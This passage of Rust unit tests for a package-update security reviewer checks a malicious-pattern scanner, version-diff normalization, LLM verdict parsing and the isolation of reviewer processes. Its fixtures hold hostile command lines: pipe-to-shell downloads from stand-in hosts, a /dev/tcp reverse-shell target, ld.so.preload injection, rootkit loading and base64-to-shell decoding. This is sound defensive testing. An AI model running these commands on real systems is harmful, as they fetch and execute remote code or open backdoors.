        std::fs::write(source.path().join("Cargo.toml"), b"synthetic original").unwrap();
        let pending = crate::same_user_supervisor::PendingAttempt::begin(&state, ATTEMPT).unwrap();
        pending.capture_synthetic_files(&source).unwrap();
        pending
            .store_synthetic_postimage(b"synthetic modified")
            .unwrap();
        let manifest = source.path().join("Cargo.toml");
        let mut child = Command::new("/bin/sh")
            .args(["-c", "IFS= read -r line; [ \"$line\" = go ] || exit 90; printf 'synthetic modified' > \"$1\"", "fixture"])
            .arg(&manifest).env_clear().stdin(Stdio::piped()).stdout(Stdio::null()).stderr(Stdio::null())
            .spawn().unwrap();
        let mut input = child.stdin.take().unwrap();
        let mut observed = pending.bind_child(&mut child).unwrap();
        input.write_all(b"go\n").unwrap();
        drop(input);
        let deadline = Instant::now() + Duration::from_secs(3);
        loop {
            if let Some(success) = observed.poll_and_record_exit().unwrap() {
                assert!(success);
                assert!(!observed.permits_operation());
                break;
            }
            assert!(Instant::now() < deadline, "synthetic child did not exit");
            std::thread::sleep(Duration::from_millis(10));
        }
        assert_eq!(std::fs::read(&manifest).unwrap(), b"synthetic modified");
        let copy =
            crate::same_user_supervisor::reopen_synthetic_attempt_after_exit(&state, &source)
                .unwrap();
        assert_eq!(
            std::fs::read(copy.path().join("Cargo.toml")).unwrap(),
            b"synthetic original"
        );
        assert_eq!(std::fs::read(&manifest).unwrap(), b"synthetic original");
        let records: Vec<_> = [
            "pending-intent",
            "pending-snapshot",
            "pending-fixture-postimage",
            "pending-exit",
            "pending-fixture-rollback",
        ]
        .into_iter()
        .map(|name| (name, std::fs::read(state.join(name)).unwrap()))
        .collect();
        let status = Command::new(std::env::current_exe().unwrap())
            .args([
                "--exact",
                "review::tests::recovered_fixture_state_keeps_source_reviews_inconclusive",
            ])
            .env_clear()
            .env("HOME", root.path())
            .env("TMPDIR", root.path())
            .env("XDG_STATE_HOME", root.path())
            .env(WORKER, root.path())
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .unwrap();
        assert!(status.success(), "isolated review worker failed: {status}");
        for (name, bytes) in records {
            assert_eq!(std::fs::read(state.join(name)).unwrap(), bytes);
        }
        assert_eq!(
            std::fs::read(source.path().join("Cargo.toml")).unwrap(),
            b"synthetic original"
        );
        assert_eq!(
            crate::same_user_supervisor::inspect_synthetic_rollback_target(&state, &source),
            crate::same_user_supervisor::SyntheticTargetObservation::MatchesSnapshot
        );
        assert!(crate::same_user_supervisor::PendingAttempt::begin(&state, ATTEMPT).is_err());
        let inspection = crate::same_user_supervisor::inspect_recovery(&state);
        assert_eq!(
            inspection.descendant_cleanup,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert_eq!(
            inspection.rollback,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn review_runner_seam_preserves_enabled_provider_dispatch() {
        use std::os::unix::process::ExitStatusExt;
        let mut config = Config::default();
        config.security.review_provider = Some("apple".into());
        let result = llm_verdict_with_runner(
            &config,
            "synthetic source",
            || panic!("Codex preflight must not run for another provider"),
            |program, args, input| async move {
                assert_eq!(program, "/usr/bin/fm");
                assert!(!args.is_empty());
                assert!(input.is_some());
                Ok(std::process::Output {
                    status: std::process::ExitStatus::from_raw(0),
                    stdout: b"VERDICT: safe\nREASON: synthetic\n".to_vec(),
                    stderr: Vec::new(),
                })
            },
        )
        .await;
        assert_eq!(result, Some((ReviewVerdict::Safe, "synthetic".into())));
    }

    #[tokio::test]
    async fn codex_auth_intent_never_enables_provider_and_separates_cache_keys() {
        let dep = Dependency {
            name: "synthetic".into(),
            current_version: "1".into(),
            latest_version: "2".into(),
            ecosystem: Ecosystem::Homebrew,
            is_global: true,
            origin: None,
        };
        let mut config = Config::default();
        config.security.review_provider = Some("codex".into());
        let mut keys = Vec::new();
        for mode in [
            None,
            Some(crate::config::CodexAuthMode::Chatgpt),
            Some(crate::config::CodexAuthMode::ApiKey),
            Some(crate::config::CodexAuthMode::Invalid),
        ] {
            config.security.codex_auth_mode = mode;
            assert!(llm_verdict(&config, "synthetic source").await.is_none());
            let expected = match mode {
                None => "Codex authentication mode missing — treat as unreviewed",
                Some(crate::config::CodexAuthMode::Invalid) => {
                    "Codex authentication mode invalid — treat as unreviewed"
                }
                _ => "provider isolation not verified — treat as unreviewed",
            };
            assert_eq!(unavailable_review_reason(&config), expected);
            keys.push(review_cache_key(&dep, &config));
        }
        keys.sort();
        keys.dedup();
        assert_eq!(keys.len(), 4);
    }

    #[test]
    fn legacy_inconclusive_cache_reports_unverified_isolation() {
        let mut config = Config::default();
        config.security.review_provider = Some("codex".into());
        config.security.codex_auth_mode = Some(crate::config::CodexAuthMode::ApiKey);
        let report = ReviewReport {
            verdict: ReviewVerdict::Review,
            reason: "LLM output unparsable — treat as unreviewed".into(),
            view_mode: ReviewViewMode::Diff,
            residual_line_count: 1,
            hits: Vec::new(),
            origin: ReviewOrigin::Unknown,
        };
        let actual = enforce_provider_availability(report, &config);
        assert_eq!(actual.verdict, ReviewVerdict::Review);
        assert_eq!(
            actual.reason,
            "provider isolation not verified — treat as unreviewed"
        );
    }

    #[tokio::test]
    async fn oversized_review_payload_is_rejected_without_truncation() {
        let at_limit = "é".repeat(MAX_REVIEW_PAYLOAD_BYTES / 2);
        let prompt = build_review_prompt(&at_limit).unwrap();
        assert!(prompt.ends_with(&at_limit));
        let too_large = format!("{at_limit}x");
        assert!(build_review_prompt(&too_large).is_none());
        let mut config = Config::default();
        config.security.review_provider = Some("apple".into());
        assert!(llm_verdict(&config, &too_large).await.is_none());
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn model_output_limit_rejects_oversized_safe_verdict() {
        let args = vec![
            "-c".into(),
            "printf 'VERDICT: safe\\nREASON: fixture\\n'; head -c 64001 /dev/zero".into(),
        ];
        let result = run_model_command("/bin/sh", &args, None).await;
        assert_eq!(result.unwrap_err(), "model output exceeded limit");
        let args = vec!["-c".into(), "head -c 64000 /dev/zero".into()];
        let result = run_model_command("/bin/sh", &args, None).await.unwrap();
        assert_eq!(result.stdout.len(), 64_000);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn unavailable_isolation_never_launches_agent_or_accepts_safe_verdict() {
        use std::os::unix::fs::PermissionsExt;

        if std::env::var_os("TUCUPI_ISOLATION_TEST_CHILD").is_none() {
            let dir = tempfile::tempdir().unwrap();
            let bin = dir.path().join("bin");
            std::fs::create_dir(&bin).unwrap();
            for name in ["opencode", "claude", "codex", "agy", "grok"] {
                let path = bin.join(name);
                std::fs::write(&path, "#!/bin/sh\nprintf launched > \"$HOME/launched\"\nprintf 'VERDICT: safe\\nREASON: fixture\\n'\n").unwrap();
                std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o700)).unwrap();
            }
            let status = std::process::Command::new(std::env::current_exe().unwrap())
                .args(["--exact", "review::tests::unavailable_isolation_never_launches_agent_or_accepts_safe_verdict"])
                .env("HOME", dir.path())
                .env("PATH", &bin)
                .env("TUCUPI_ISOLATION_TEST_CHILD", "1")
                .status().unwrap();
            assert!(status.success());
            assert!(!dir.path().join("launched").exists());
            return;
        }
        for provider in ["opencode", "claude", "codex", "agy", "grok"] {
            let mut config = Config::default();
            config.security.review_provider = Some(provider.into());
            assert!(llm_verdict(&config, "untrusted package source")
                .await
                .is_none());
            let stale = ReviewReport {
                verdict: ReviewVerdict::Safe,
                reason: "old AI approval".into(),
                view_mode: ReviewViewMode::Diff,
                residual_line_count: 1,
                hits: Vec::new(),
                origin: ReviewOrigin::Unknown,
            };
            assert_eq!(
                enforce_provider_availability(stale, &config).verdict,
                ReviewVerdict::Review
            );
        }
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn model_process_does_not_inherit_synthetic_credentials() {
        if std::env::var_os("TUCUPI_MODEL_ENV_TEST_CHILD").is_none() {
            let status = std::process::Command::new(std::env::current_exe().unwrap())
                .args([
                    "--exact",
                    "review::tests::model_process_does_not_inherit_synthetic_credentials",
                ])
                .env("TUCUPI_MODEL_ENV_TEST_CHILD", "1")
                .env("TUCUPI_SYNTHETIC_CREDENTIAL", "synthetic-only")
                .status()
                .unwrap();
            assert!(status.success());
            return;
        }
        assert_eq!(
            std::env::var("TUCUPI_SYNTHETIC_CREDENTIAL").unwrap(),
            "synthetic-only"
        );
        let args = vec!["-c".into(), "if [ -n \"${TUCUPI_SYNTHETIC_CREDENTIAL+x}\" ]; then exit 42; fi; printf 'VERDICT: review\\nREASON: fixture\\n'".into()];
        let output = run_model_command("/bin/sh", &args, None).await.unwrap();
        assert!(matches!(
            parse_verdict_output(&String::from_utf8_lossy(&output.stdout)),
            Some((ReviewVerdict::Review, _))
        ));
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn model_command_passes_input_and_rejects_failure() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("fake-model");
        std::fs::write(&path, "#!/bin/sh\nread line\n[ \"$line\" = example ] || exit 1\nprintf 'VERDICT: review\\nREASON: example\\n'\n").unwrap();
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o700)).unwrap();
        let program = path.to_str().unwrap();
        let output = run_model_command(program, &[], Some("example\n"))
            .await
            .unwrap();
        assert_eq!(
            parse_verdict_output(&String::from_utf8_lossy(&output.stdout))
                .unwrap()
                .0,
            ReviewVerdict::Review
        );
        assert!(run_model_command(program, &[], Some("wrong\n"))
            .await
            .is_err());
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn model_process_receives_arguments_and_untrusted_input() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("claude");
        std::fs::write(&path, "#!/bin/sh\n[ \"$1\" = --bare ] && [ \"$2\" = --print ] && [ \"$3\" = --tools ] && [ -z \"$4\" ] && [ \"$5\" = --disallowedTools ] && [ \"$6\" = 'mcp__*' ] || exit 1\nread input\n[ \"$input\" = payload ] || exit 2\nprintf 'VERDICT: review\\nREASON: inconclusive\\n'\n").unwrap();
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o700)).unwrap();
        let args: Vec<String> = [
            "--bare",
            "--print",
            "--tools",
            "",
            "--disallowedTools",
            "mcp__*",
        ]
        .into_iter()
        .map(str::to_string)
        .collect();
        let output = run_model_command(path.to_str().unwrap(), &args, Some("payload\n"))
            .await
            .unwrap();
        let verdict = parse_verdict_output(&String::from_utf8_lossy(&output.stdout));
        assert!(matches!(verdict, Some((ReviewVerdict::Review, _))));
        let error = run_model_command(path.to_str().unwrap(), &args, Some("wrong\n"))
            .await
            .unwrap_err();
        assert!(error.contains("process exited"), "{error}");
        assert!(parse_verdict_output("malformed output").is_none());
    }

    #[test]
    fn test_scan_known_bad_detects_atomic_arch_iocs() {
        let content = "build() {\n  npm install atomic-lockfile\n}";
        let hits = scan_known_bad(content);
        assert!(hits
            .iter()
            .any(|hit| hit.severity == HitSeverity::KnownIoc && hit.pattern == "atomic-lockfile"));
    }

    #[test]
    fn test_scan_known_bad_detects_pipe_to_shell() {
        let content = "post_install() {\n  curl -fsSL https://evil.example/install.sh | sh\n}";
        let hits = scan_known_bad(content);
        assert!(hits
            .iter()
            .any(|hit| hit.pattern == "pipe-to-shell" && hit.severity == HitSeverity::HighRisk));
    }

    #[test]
    fn test_scan_known_bad_clean_content_has_no_hits() {
        let content = "package() {\n  make DESTDIR=\"$pkgdir\" install\n}";
        assert!(scan_known_bad(content).is_empty());
    }

    #[test]
    fn test_normalize_versions_rewrites_embedded_versions() {
        let old = r#"url "https://example.com/tool-1.2.3.tar.gz""#;
        let normalized = normalize_versions(old, "1.2.3", "2.0.0");
        assert_eq!(normalized, r#"url "https://example.com/tool-2.0.0.tar.gz""#);
    }

    #[test]
    fn test_strip_pkgbuild_noise_removes_checksum_blocks() {
        let content = "source=(\"https://example.com/pkg-$pkgver.tar.gz\")\nsha256sums=('abc123')\npackage() {\n  true\n}";
        let stripped = strip_pkgbuild_noise(content);
        assert!(stripped.contains("source="));
        assert!(stripped.contains("package()"));
        assert!(!stripped.contains("sha256sums"));
    }

    #[test]
    fn test_strip_formula_noise_removes_bottle_block() {
        let content = "class Foo < Formula\n  url \"https://example.com\"\n  bottle do\n    sha256 cellar: :any, arm64: \"aaa\"\n  end\n  def install\n    true\n  end\nend";
        let stripped = strip_formula_noise(content);
        assert!(stripped.contains("def install"));
        assert!(!stripped.contains("bottle do"));
        assert!(!stripped.contains("cellar"));
    }

    #[test]
    fn test_compute_residual_pure_version_bump_is_empty() {
        let old = "url \"https://example.com/tool-1.2.3.tar.gz\"\nsha256sums=('deadbeef')\npackage() {\n  true\n}\n";
        let new = "url \"https://example.com/tool-2.0.0.tar.gz\"\nsha256sums=('cafebabe')\npackage() {\n  true\n}\n";
        let residual = compute_residual(old, new, "1.2.3", "2.0.0", true);
        assert_eq!(count_residual_lines(&residual), 0);
    }

    #[test]
    fn test_compute_residual_detects_injected_command() {
        let old = "package() {\n  make install\n}\n";
        let new = "package() {\n  curl https://evil.example/x.sh | sh\n  make install\n}\n";
        let residual = compute_residual(old, new, "1.0.0", "1.1.0", true);
        assert!(residual.contains("curl"));
        assert!(count_residual_lines(&residual) > 0);
    }

    #[test]
    fn test_parse_verdict_output_accepts_all_verdicts() {
        let (verdict, reason) =
            parse_verdict_output("VERDICT: safe\nREASON: version bump only").unwrap();
        assert_eq!(verdict, ReviewVerdict::Safe);
        assert_eq!(reason, "version bump only");

        let (verdict, _) =
            parse_verdict_output("VERDICT: review\nREASON: new network call").unwrap();
        assert_eq!(verdict, ReviewVerdict::Review);

        let (verdict, _) =
            parse_verdict_output("VERDICT: block\nREASON: malicious dropper").unwrap();
        assert_eq!(verdict, ReviewVerdict::Block);
    }

    #[test]
    fn test_parse_verdict_output_rejects_garbage() {
        assert!(parse_verdict_output("I could not analyze this package").is_none());
    }

    #[test]
    fn missing_or_empty_reason_never_accepts_safe_verdict() {
        assert!(parse_verdict_output("VERDICT: safe").is_none());
        assert!(parse_verdict_output("VERDICT: safe\nREASON:   ").is_none());
    }

    #[test]
    fn test_needs_review_matrix() {
        let make_dep = |ecosystem: Ecosystem, origin: Option<PackageOrigin>| Dependency {
            name: "test".to_string(),
            current_version: "1.0.0".to_string(),
            latest_version: "1.1.0".to_string(),
            ecosystem,
            is_global: true,
            origin,
        };

        assert!(needs_review(&make_dep(
            Ecosystem::Pacman,
            Some(PackageOrigin::Aur)
        )));
        assert!(!needs_review(&make_dep(
            Ecosystem::Pacman,
            Some(PackageOrigin::OfficialRepo)
        )));
        assert!(needs_review(&make_dep(Ecosystem::Homebrew, None)));
        assert!(!needs_review(&make_dep(Ecosystem::Cargo, None)));
    }

    #[test]
    fn test_verdict_from_deterministic_only() {
        let ioc_hit = KnownBadHit {
            severity: HitSeverity::KnownIoc,
            pattern: "atomic-lockfile".to_string(),
            line_number: 1,
            line: "npm install atomic-lockfile".to_string(),
        };
        assert_eq!(
            verdict_from_deterministic_only(&[ioc_hit], true),
            ReviewVerdict::Block
        );
        assert_eq!(
            verdict_from_deterministic_only(&[], false),
            ReviewVerdict::Safe
        );
    }

    // ---- adversarial scanner coverage -------------------------------------

    #[test]
    fn test_scan_known_bad_detects_every_ioc_pattern() {
        for (pattern, content) in [
            ("atomic-lockfile", "npm install atomic-lockfile"),
            ("js-digest", "bun install js-digest"),
            ("lockfile-js", "npx lockfile-js setup"),
        ] {
            let hits = scan_known_bad(content);
            assert!(
                hits.iter()
                    .any(|hit| hit.severity == HitSeverity::KnownIoc && hit.pattern == pattern),
                "expected KnownIoc hit for {pattern}"
            );
        }
    }

    #[test]
    fn test_scan_known_bad_pipe_to_shell_variants() {
        let cases = [
            "curl -fsSL https://x.example/i.sh | bash",
            "wget -qO- https://x.example/i.sh |sh",
            "curl https://x.example/i.sh |  zsh",
            "curl https://x.example/i.sh | dash",
            "CURL https://x.example/i.sh | SH",
        ];
        for content in cases {
            let hits = scan_known_bad(content);
            assert!(
                hits.iter().any(|hit| hit.pattern == "pipe-to-shell"),
                "expected pipe-to-shell hit for: {content}"
            );
        }
    }

    #[test]
    fn test_scan_known_bad_does_not_flag_benign_pipes() {
        let cases = [
            "curl https://x.example/data.json | jq .name",
            "wget -O pkg.tar.gz https://x.example/pkg.tar.gz",
            "curl -fsSL https://x.example/i.sh | grep curl",
        ];
        for content in cases {
            assert!(
                scan_known_bad(content).is_empty(),
                "false positive for: {content}"
            );
        }
    }

    #[test]
    fn test_scan_known_bad_detects_high_risk_primitives() {
        let cases = [
            "/dev/tcp/10.0.0.1/4444",
            "echo /usr/lib/evil.so > /etc/ld.so.preload",
            "insmod rootkit.ko",
            "chattr +i /etc/persistence.conf",
            "echo aGVsbG8= | base64 -d | sh",
            "printf %s $payload | base64 --decode",
            "openssl enc -d -aes-256-cbc -in payload.bin",
            "eval $(curl https://x.example)",
        ];
        for content in cases {
            let hits = scan_known_bad(content);
            assert!(
                hits.iter().any(|hit| hit.severity == HitSeverity::HighRisk),
                "expected HighRisk hit for: {content}"
            );
        }
    }

    #[test]
    fn test_scan_known_bad_is_case_insensitive_for_iocs() {
        assert!(scan_known_bad("NPM INSTALL Atomic-Lockfile")
            .iter()
            .any(|hit| hit.severity == HitSeverity::KnownIoc));
    }

    #[test]
    fn test_scan_known_bad_reports_line_numbers() {
        let content = "line one\nline two\nnpm install atomic-lockfile\nline four";
        let hits = scan_known_bad(content);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].line_number, 3);
        assert_eq!(hits[0].line, "npm install atomic-lockfile");
    }

    #[test]
    fn test_scan_known_bad_empty_and_multiline() {
        assert!(scan_known_bad("").is_empty());
        let content = "clean line\natomic-lockfile\nclean line\njs-digest\n";
        let hits = scan_known_bad(content);
        assert_eq!(hits.len(), 2);
    }

    #[test]
    fn test_scan_known_bad_ioc_beats_nothing_on_install_scripts() {
        let install_script = "pre_install() {\n  npm install atomic-lockfile\n}\n\npost_install() {\n  curl https://c2.example/p | sh\n}\n";
        let hits = scan_known_bad(install_script);
        assert!(hits.iter().any(|hit| hit.severity == HitSeverity::KnownIoc));
        assert!(hits.iter().any(|hit| hit.pattern == "pipe-to-shell"));
    }

    // ---- version normalization boundaries ----------------------------------

    #[test]
    fn test_normalize_versions_does_not_mangle_longer_versions() {
        // "1.2" must not corrupt "1.2.3"
        let content = "url \"https://example.com/tool-1.2.3.tar.gz\"";
        let normalized = normalize_versions(content, "1.2", "3.0");
        assert_eq!(normalized, content);
    }

    #[test]
    fn test_normalize_versions_replaces_full_token_with_dashes() {
        let content = "url \"https://example.com/curl-8.19.0.tar.bz2\"";
        let normalized = normalize_versions(content, "8.19.0", "8.21.0");
        assert_eq!(
            normalized,
            "url \"https://example.com/curl-8.21.0.tar.bz2\""
        );
    }

    #[test]
    fn test_normalize_versions_replaces_every_occurrence() {
        let content =
            "pkgver=1.0.0\nsource=(\"https://x.example/p-1.0.0.tgz\")\nsha256sums=('aaa')";
        let normalized = normalize_versions(content, "1.0.0", "2.0.0");
        assert!(normalized.contains("pkgver=2.0.0"));
        assert!(normalized.contains("p-2.0.0.tgz"));
        assert!(!normalized.contains("1.0.0"));
    }

    #[test]
    fn test_normalize_versions_noop_cases() {
        let content = "pkgver=1.0.0";
        assert_eq!(normalize_versions(content, "", "2.0.0"), content);
        assert_eq!(normalize_versions(content, "1.0.0", ""), content);
        assert_eq!(normalize_versions(content, "1.0.0", "1.0.0"), content);
    }

    #[test]
    fn test_normalize_versions_does_not_touch_version_inside_word() {
        // "v1.2" contains "1.2" preceded by an alphanumeric byte: leaving it
        // alone produces residual diff -> review, which is the safe direction.
        let content = "tag = \"v1.2\"";
        assert_eq!(normalize_versions(content, "1.2", "3.0"), content);
    }

    // ---- noise stripping edges ---------------------------------------------

    #[test]
    fn test_strip_pkgbuild_noise_removes_multiline_checksum_block() {
        let content = "source=(\"a\" \"b\")\nsha256sums=(\n  'hash-one'\n  'hash-two'\n)\nbuild() {\n  true\n}";
        let stripped = strip_pkgbuild_noise(content);
        assert!(!stripped.contains("hash-one"));
        assert!(!stripped.contains("hash-two"));
        assert!(stripped.contains("build()"));
    }

    #[test]
    fn test_strip_pkgbuild_noise_handles_all_checksum_families() {
        for key in ["md5sums=", "b2sums=", "sha512sums=", "cksums="] {
            let content = format!("package() {{\n  true\n}}\n{key}('hash')\n");
            assert!(
                !strip_pkgbuild_noise(&content).contains(key),
                "checksum family {key} was not stripped"
            );
        }
    }

    #[test]
    fn test_strip_pkgbuild_noise_unterminated_block_degrades_gracefully() {
        // malformed PKGBUILD: never panic, drop only what was clearly the block
        let content = "sha256sums=(\n  'hash'\n";
        let stripped = strip_pkgbuild_noise(content);
        assert!(!stripped.contains("hash"));
    }

    #[test]
    fn test_strip_formula_noise_preserves_other_blocks() {
        let content = "class Foo < Formula\n  head do\n    url \"https://git.example\"\n  end\n\n  bottle do\n    rebuild 1\n    sha256 cellar: :any, arm64: \"aaa\"\n  end\n\n  def install\n    system \"make\"\n  end\nend";
        let stripped = strip_formula_noise(content);
        assert!(stripped.contains("head do"));
        assert!(stripped.contains("def install"));
        assert!(!stripped.contains("rebuild 1"));
        assert!(stripped.matches("end").count() >= 3);
    }

    // ---- residual diff semantics --------------------------------------------

    #[test]
    fn test_compute_residual_reports_only_real_changes() {
        let old = "depends_on \"openssl@3\"\ndepends_on \"zstd\"\n";
        let new = "depends_on \"openssl@3\"\ndepends_on \"zstd\"\ndepends_on \"libpsl\"\n";
        let residual = compute_residual(old, new, "1.0.0", "2.0.0", false);
        assert!(residual.contains("+depends_on \"libpsl\""));
        assert_eq!(count_residual_lines(&residual), 1);
    }

    #[test]
    fn test_compute_residual_counts_removed_lines() {
        let old = "depends_on \"openssl@3\"\n";
        let new = "";
        let residual = compute_residual(old, new, "1.0.0", "2.0.0", false);
        assert!(residual.contains("-depends_on"));
        assert_eq!(count_residual_lines(&residual), 1);
    }

    #[test]
    fn test_compute_residual_changed_line_counts_as_two() {
        let old = "url \"https://x.example/a.tar.gz\"\n";
        let new = "url \"https://y.example/b.tar.gz\"\n";
        let residual = compute_residual(old, new, "1.0.0", "2.0.0", false);
        assert_eq!(count_residual_lines(&residual), 2);
    }

    #[test]
    fn test_count_residual_lines_ignores_diff_headers() {
        let diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1 +1 @@\n-old line\n+new line\n";
        assert_eq!(count_residual_lines(diff), 2);
    }

    #[test]
    fn test_compute_residual_formula_checksum_and_version_churn_is_silent() {
        let old = "version \"3.1.4\"\nsha256 \"aaaaaaaa\"\nbottle do\n  rebuild 2\n  sha256 cellar: :any, arm64: \"bbbb\"\nend\n";
        let new = "version \"3.2.0\"\nsha256 \"cccccccc\"\nbottle do\n  rebuild 1\n  sha256 cellar: :any, arm64: \"dddd\"\nend\n";
        let residual = compute_residual(old, new, "3.1.4", "3.2.0", false);
        assert_eq!(count_residual_lines(&residual), 0);
    }

    // ---- verdict parsing robustness ------------------------------------------

    #[test]
    fn test_parse_verdict_output_handles_llm_preamble_and_suffix() {
        let output = "Sure, here is my analysis.\n\nVERDICT: safe\nREASON: version bump only\n\nHope this helps!";
        let (verdict, reason) = parse_verdict_output(output).unwrap();
        assert_eq!(verdict, ReviewVerdict::Safe);
        assert_eq!(reason, "version bump only");
    }

    #[test]
    fn test_parse_verdict_output_is_case_insensitive() {
        let (verdict, _) = parse_verdict_output("VERDICT: BLOCK\nREASON: malware").unwrap();
        assert_eq!(verdict, ReviewVerdict::Block);
    }

    #[test]
    fn test_parse_verdict_output_handles_crlf() {
        let (verdict, reason) =
            parse_verdict_output("VERDICT: review\r\nREASON: new network call\r\n").unwrap();
        assert_eq!(verdict, ReviewVerdict::Review);
        assert_eq!(reason, "new network call");
    }

    #[test]
    fn test_parse_verdict_output_first_verdict_wins() {
        let (verdict, _) =
            parse_verdict_output("VERDICT: safe\nVERDICT: block\nREASON: a").unwrap();
        assert_eq!(verdict, ReviewVerdict::Safe);
    }

    #[test]
    fn test_parse_verdict_output_keeps_reason_with_colons() {
        let (_, reason) =
            parse_verdict_output("VERDICT: block\nREASON: IoC: atomic-lockfile at line 12")
                .unwrap();
        assert_eq!(reason, "IoC: atomic-lockfile at line 12");
    }

    #[test]
    fn test_parse_verdict_output_invalid_verdict_is_none() {
        assert!(parse_verdict_output("VERDICT: maybe\nREASON: unsure").is_none());
        assert!(parse_verdict_output("").is_none());
    }

    // ---- report helpers -------------------------------------------------------

    #[test]
    fn test_unavailable_report_is_inconclusive() {
        let report = ReviewReport::unavailable("could not fetch");
        assert_eq!(report.verdict, ReviewVerdict::Review);
        assert_eq!(report.view_mode, ReviewViewMode::Unavailable);
        assert!(!report.has_known_ioc());
    }

    #[test]
    fn test_has_known_ioc_detection() {
        let report = ReviewReport {
            verdict: ReviewVerdict::Block,
            reason: "test".to_string(),
            view_mode: ReviewViewMode::Diff,
            residual_line_count: 1,
            hits: vec![KnownBadHit {
                severity: HitSeverity::KnownIoc,
                pattern: "js-digest".to_string(),
                line_number: 4,
                line: "bun install js-digest".to_string(),
            }],
            origin: ReviewOrigin::Unknown,
        };
        assert!(report.has_known_ioc());
    }

    // ---- end-to-end (opt-in: network + brew + opencode) ----------------------

    #[test]
    #[ignore = "end-to-end: requires network, brew and an authenticated opencode"]
    fn test_review_formula_end_to_end_curl() {
        let runtime = tokio::runtime::Runtime::new().unwrap();
        runtime.block_on(async {
            let dep = Dependency {
                name: "curl".to_string(),
                current_version: "8.19.0".to_string(),
                latest_version: "8.21.0".to_string(),
                ecosystem: Ecosystem::Homebrew,
                is_global: true,
                origin: None,
            };
            let report = review_package(&dep, &Config::default()).await;
            eprintln!("review report: {report:#?}");
            assert_eq!(
                report.view_mode,
                ReviewViewMode::Diff,
                "expected baseline commit to resolve for curl 8.19.0"
            );
            assert!(
                report.residual_line_count > 0,
                "curl 8.19.0 -> 8.21.0 added libpsl; residual must not be empty"
            );
        });
    }
}
